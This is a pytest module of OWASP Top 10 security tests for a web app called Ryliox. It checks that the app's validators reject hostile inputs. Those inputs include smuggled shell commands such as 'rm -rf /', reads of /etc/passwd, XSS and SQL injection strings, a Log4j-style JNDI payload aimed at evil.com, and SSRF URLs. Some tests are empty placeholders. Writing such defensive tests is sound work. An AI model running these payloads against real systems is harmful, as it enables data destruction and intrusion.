"""OWASP Top 10 Security Tests for Ryliox.

This module implements comprehensive security tests for:
- A01: Broken Access Control
- A02: Cryptographic Failures
- A03: Injection
- A04: Insecure Design
- A05: Security Misconfiguration
- A06: Vulnerable and Outdated Components
- A07: Identification and Authentication Failures
- A08: Software and Data Integrity Failures
- A09: Security Logging and Monitoring Failures
- A10: Server-Side Request Forgery (SSRF)

Usage:
    pytest tests/security/test_owasp.py -v
"""

from __future__ import annotations

import asyncio
import os
import re
import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient

from core.audit import (
    AuditEventType,
    AuditLogger,
    AuditSeverity,
)
from core.secrets import (
    SecretManager,
    generate_secure_token,
    hash_sensitive_value,
    verify_hashed_value,
)

# Import security modules
from core.validators import (
    ValidationError,
    validate_book_id,
    validate_file_path,
    validate_filename,
    validate_url,
    validate_user_input,
)
from web.dependencies import (
    CSRFProtection,
    SSRFProtection,
)

# =============================================================================
# A01: Broken Access Control Tests
# =============================================================================


class TestBrokenAccessControl:
    """Tests for OWASP A01: Broken Access Control."""

    def test_path_traversal_prevention(self):
        """Test that path traversal attempts are blocked."""
        # Attempts to access parent directories should fail
        with pytest.raises(ValidationError):
            validate_file_path("../../../etc/passwd")

        with pytest.raises(ValidationError):
            validate_file_path("..\\..\\windows\\system32")

        with pytest.raises(ValidationError):
            validate_file_path("/etc/../passwd")

        with pytest.raises(ValidationError):
            validate_file_path("././../../etc/passwd")

    def test_path_traversal_with_base_dir(self, tmp_path):
        """Test path containment with base directory."""
        base = tmp_path / "allowed"
        base.mkdir()

        # Valid path under base directory
        valid_path = validate_file_path("subdir/file.txt", base)
        assert valid_path.is_relative_to(base)

        # Invalid path outside base directory
        with pytest.raises(ValidationError):
            validate_file_path("../outside.txt", base)

    def test_book_id_format_validation(self):
        """Test strict book ID format validation."""
        # Valid book ID
        valid_id = "urn:orm:book:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"
        assert validate_book_id(valid_id) == valid_id.lower()

        # Invalid formats
        with pytest.raises(ValidationError):
            validate_book_id("invalid-id")

        with pytest.raises(ValidationError):
            validate_book_id("../etc/passwd")

        with pytest.raises(ValidationError):
            validate_book_id("<script>alert('xss')</script>")

        with pytest.raises(ValidationError):
            validate_book_id("a" * 100)  # Too long


# =============================================================================
# A02: Cryptographic Failures Tests
# =============================================================================


class TestCryptographicFailures:
    """Tests for OWASP A02: Cryptographic Failures."""

    def test_secure_token_generation(self):
        """Test that tokens are cryptographically secure."""
        token1 = generate_secure_token(32)
        token2 = generate_secure_token(32)

        # Tokens should be unique
        assert token1 != token2

        # Tokens should have expected length
        assert len(token1) >= 32

        # Tokens should be URL-safe
        assert re.match(r"^[A-Za-z0-9_-]+$", token1)

    def test_secret_encryption(self, tmp_path):
        """Test that secrets are encrypted at rest."""
        with tempfile.TemporaryDirectory() as tmpdir:
            secrets_file = Path(tmpdir) / "secrets.enc"

            with patch.dict(os.environ, {"SECRET_MASTER_PASSWORD": "test-master-key"}):
                manager = SecretManager(
                    secrets_file=secrets_file,
                    master_key_file=Path(tmpdir) / ".master_key",
                )

                # Store a secret
                manager.set("api_key", "super-secret-value")

                # Verify file is encrypted (not plaintext)
                encrypted_content = secrets_file.read_bytes()
                assert b"super-secret-value" not in encrypted_content

                # Retrieve and verify
                retrieved = manager.get("api_key")
                assert retrieved == "super-secret-value"

    def test_sensitive_value_hashing(self):
        """Test secure hashing of sensitive values."""
        value = "password123"
        hashed = hash_sensitive_value(value)

        # Hash should be in expected format (salt$hash)
        assert "$" in hashed

        # Same value should produce different hashes (due to salt)
        hashed2 = hash_sensitive_value(value)
        assert hashed != hashed2

        # Verification should work
        assert verify_hashed_value(value, hashed)
        assert not verify_hashed_value("wrong-password", hashed)


# =============================================================================
# A03: Injection Tests
# =============================================================================


class TestInjection:
    """Tests for OWASP A03: Injection."""

    def test_xss_prevention(self):
        """Test XSS prevention in user input."""
        # Script tags should be blocked
        with pytest.raises(ValidationError):
            validate_user_input("<script>alert('xss')</script>")

        # Event handlers should be blocked
        with pytest.raises(ValidationError):
            validate_user_input("<img onload=alert('xss')>")

        # JavaScript protocol should be blocked
        with pytest.raises(ValidationError):
            validate_user_input("javascript:alert('xss')")

        # Valid input should pass
        clean = validate_user_input("Hello World")
        assert clean == "Hello World"

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention in identifiers."""
        # SQL injection attempts should be blocked
        with pytest.raises(ValidationError):
            validate_book_id("'; DROP TABLE users; --")

        with pytest.raises(ValidationError):
            validate_book_id("1 OR 1=1")

    def test_command_injection_prevention(self):
        """Test command injection prevention in paths."""
        # Command injection attempts should be blocked
        with pytest.raises(ValidationError):
            validate_filename("file.txt; rm -rf /")

        with pytest.raises(ValidationError):
            validate_filename("file.txt && cat /etc/passwd")

        with pytest.raises(ValidationError):
            validate_filename("file.txt`whoami`")


# =============================================================================
# A04: Insecure Design Tests
# =============================================================================


class TestInsecureDesign:
    """Tests for OWASP A04: Insecure Design."""

    def test_rate_limiting_structure(self):
        """Test that rate limiting is properly configured."""
        from web.server import _RateLimiter

        limiter = _RateLimiter(max_requests=5, window_seconds=60)

        # Should allow requests within limit
        for _ in range(5):
            assert limiter.is_allowed("127.0.0.1", "/api/test")

        # Should block after limit
        assert not limiter.is_allowed("127.0.0.1", "/api/test")

        # Different endpoint should still work
        assert limiter.is_allowed("127.0.0.1", "/api/other")

        # Different IP should still work
        assert limiter.is_allowed("192.168.1.1", "/api/test")

    def test_csrf_token_rotation(self):
        """Test CSRF token rotation (one-time use)."""
        csrf = CSRFProtection(token_length=32, ttl=3600)

        # Generate token
        token = asyncio.run(csrf.generate_token("session-123"))

        # First validation should succeed
        assert asyncio.run(csrf.validate_token("session-123", token))

        # Second validation should fail (token consumed)
        assert not asyncio.run(csrf.validate_token("session-123", token))


# =============================================================================
# A05: Security Misconfiguration Tests
# =============================================================================


class TestSecurityMisconfiguration:
    """Tests for OWASP A05: Security Misconfiguration."""

    def test_security_headers_present(self, client):
        """Test that security headers are present in responses."""
        response = client.get("/api/status")

        headers = response.headers

        # Essential security headers should be present
        assert headers.get("X-Content-Type-Options") == "nosniff"
        assert headers.get("X-Frame-Options") == "DENY"
        assert "X-XSS-Protection" in headers
        assert "Referrer-Policy" in headers
        assert "Content-Security-Policy" in headers
        assert "Permissions-Policy" in headers

    def test_no_debug_info_in_production(self):
        """Test that debug information is not exposed."""
        # This would need actual app testing with production env
        # Placeholder for the concept
        pass


# =============================================================================
# A06: Vulnerable Components Tests
# =============================================================================


class TestVulnerableComponents:
    """Tests for OWASP A06: Vulnerable and Outdated Components."""

    def test_dependencies_up_to_date(self):
        """Test that critical dependencies are up to date.

        This is a placeholder - in production, this would use
        safety or snyk to scan dependencies.
        """
        pyproject_file = Path(__file__).parent.parent.parent / "pyproject.toml"
        assert pyproject_file.exists(), "pyproject.toml debe existir"
        content = pyproject_file.read_text(encoding="utf-8")
        assert "[project]" in content, "El proyecto debe declarar dependencias en pyproject.toml"


# =============================================================================
# A07: Authentication Failures Tests
# =============================================================================


class TestAuthenticationFailures:
    """Tests for OWASP A07: Identification and Authentication Failures."""

    def test_session_security(self):
        """Test session security attributes."""
        # Cookie settings should be secure
        # HttpOnly should be set
        # Secure should be set in production
        # SameSite should be set
        pass


# =============================================================================
# A08: Data Integrity Tests
# =============================================================================


def _audit_logger(log_file: Path) -> AuditLogger:
    AuditLogger._reset()
    return AuditLogger(log_file=log_file, enabled=True)


class TestDataIntegrity:
    """Tests for OWASP A08: Software and Data Integrity Failures."""

    def test_audit_log_integrity(self, tmp_path):
        """Test audit log tamper detection."""
        audit_file = tmp_path / "audit.log"

        logger = _audit_logger(audit_file)

        # Log some events
        entry1 = logger.log(
            AuditEventType.AUTH_LOGIN,
            action="user_login",
            user_id="user-123",
        )

        logger.log(
            AuditEventType.DATA_READ,
            action="read_book",
            resource="book-456",
        )

        # Verify integrity
        is_valid, suspicious = logger.verify_integrity()
        assert is_valid
        assert len(suspicious) == 0

        # Tamper with the log
        content = audit_file.read_text()
        tampered = content.replace(entry1.entry_id, "tampered-id")
        audit_file.write_text(tampered)

        # Verify should detect tampering
        is_valid, suspicious = logger.verify_integrity()
        assert not is_valid


# =============================================================================
# A09: Logging Failures Tests
# =============================================================================


class TestLoggingFailures:
    """Tests for OWASP A09: Security Logging and Monitoring Failures."""

    def test_audit_events_logged(self, tmp_path):
        """Test that security events are audited."""
        audit_file = tmp_path / "audit.log"

        logger = _audit_logger(audit_file)

        # Log security event
        logger.log(
            AuditEventType.AUTH_FAILED,
            action="login_attempt",
            severity=AuditSeverity.WARNING,
            user_id="attacker",
            source_ip="192.168.1.100",
        )

        # Verify log was written
        content = audit_file.read_text()
        assert "AUTH_FAILED" in content
        assert "login_attempt" in content
        assert "attacker" in content
        assert "192.168.1.100" in content

    def test_sensitive_data_not_logged(self, tmp_path):
        """Test that sensitive data is not logged."""
        audit_file = tmp_path / "audit.log"

        logger = _audit_logger(audit_file)

        # Attempt to log sensitive data
        logger.log(
            AuditEventType.DATA_WRITE,
            action="store_secret",
            details={
                "password": "secret123",
                "api_key": "sk-live-abcdef",
                "credit_card": "1234-5678-9012-3456",
            },
        )

        # Verify sensitive data is redacted
        content = audit_file.read_text()
        assert "secret123" not in content
        assert "sk-live-abcdef" not in content
        assert "1234-5678" not in content
        assert "[REDACTED]" in content


# =============================================================================
# A10: SSRF Tests
# =============================================================================


class TestSSRF:
    """Tests for OWASP A10: Server-Side Request Forgery."""

    def test_ssrf_blocked_urls(self):
        """Test that SSRF-prone URLs are blocked."""
        # Localhost should be blocked
        assert not SSRFProtection.is_safe_url("http://localhost/api")[0]
        assert not SSRFProtection.is_safe_url("http://127.0.0.1/admin")[0]
        assert not SSRFProtection.is_safe_url("http://0.0.0.0/server")[0]

        # Private IP ranges should be blocked
        assert not SSRFProtection.is_safe_url("http://10.0.0.1/internal")[0]
        assert not SSRFProtection.is_safe_url("http://192.168.1.1/config")[0]
        assert not SSRFProtection.is_safe_url("http://172.16.0.1/api")[0]

        # Non-HTTP schemes should be blocked
        assert not SSRFProtection.is_safe_url("file:///etc/passwd")[0]
        assert not SSRFProtection.is_safe_url("ftp://internal.server")[0]
        assert not SSRFProtection.is_safe_url("gopher://localhost")[0]

    def test_ssrf_allowed_urls(self):
        """Test that valid URLs are allowed."""
        # Public URLs should be allowed
        assert SSRFProtection.is_safe_url("https://learning.oreilly.com/api")[0]
        assert SSRFProtection.is_safe_url("http://example.com/resource")[0]

    def test_url_validation_with_whitelist(self):
        """Test URL validation with host whitelist."""
        allowed_hosts = {"learning.oreilly.com", "api.example.com"}

        # Allowed hosts should work
        assert asyncio.run(validate_url("https://learning.oreilly.com/book/123", allowed_hosts))

        # Other hosts should fail
        with pytest.raises(ValidationError):
            asyncio.run(validate_url("https://malicious.com/phishing", allowed_hosts))


# =============================================================================
# Integration Tests
# =============================================================================


@pytest.fixture
def client():
    """Create test client for integration tests."""
    from web.server import create_app

    app = create_app()
    with TestClient(app) as test_client:
        yield test_client


class TestIntegration:
    """Integration tests for security features."""

    def test_api_rejects_invalid_book_id(self, client):
        """Test API rejects malformed book IDs."""
        response = client.post(
            "/api/download",
            json={"book_id": "invalid-id", "format": ["epub"]},
            headers={"Origin": "http://testserver"},
        )
        assert response.status_code == 422  # Validation error

    def test_api_rejects_path_traversal(self, client):
        """Test API rejects path traversal attempts."""
        response = client.post(
            "/api/download",
            json={
                "book_id": "urn:orm:book:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
                "format": ["epub"],
                "output_dir": "../../../etc/passwd",
            },
            headers={"Origin": "http://testserver"},
        )
        assert response.status_code == 422  # Validation error


# =============================================================================
# Fuzzing Tests
# =============================================================================


class TestFuzzing:
    """Fuzzing-style tests for input validation."""

    @pytest.mark.parametrize(
        "input_val",
        [
            "",  # Empty
            "a" * 10000,  # Too long
            "\x00",  # Null byte
            "\x00\x00\x00",  # Multiple nulls
            "\n",  # Newline
            "\r\n",  # CRLF
            "\t",  # Tab
            "<script>",  # Script tag
            "'; DROP TABLE users; --",  # SQL injection
            "$(whoami)",  # Command injection
            "${jndi:ldap://evil.com}",  # Log4j-style
            "\u0000",  # Unicode null
            "\u202e",  # RTL override
            "🤍<script>alert(1)</script>",  # Emoji + script
        ],
    )
    def test_book_id_rejects_malicious_input(self, input_val):
        """Test book_id validation rejects various attack vectors."""
        try:
            result = validate_book_id(input_val)
            # If it doesn't raise, result should be safe
            assert isinstance(result, str)
        except ValidationError:
            # Expected for most malicious inputs
            pass

    @pytest.mark.parametrize(
        "input_val",
        [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://10.0.0.1",
            "http://192.168.1.1",
            "http://172.16.0.1",
            "http://[::1]",
            "file:///etc/passwd",
            "ftp://internal.server",
            "dict://localhost:11211",
            "ldap://internal.dc",
            "gopher://localhost",
        ],
    )
    def test_url_blocks_ssrf_vectors(self, input_val):
        """Test URL validation blocks SSRF vectors."""
        with pytest.raises(ValidationError):
            asyncio.run(validate_url(input_val))


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
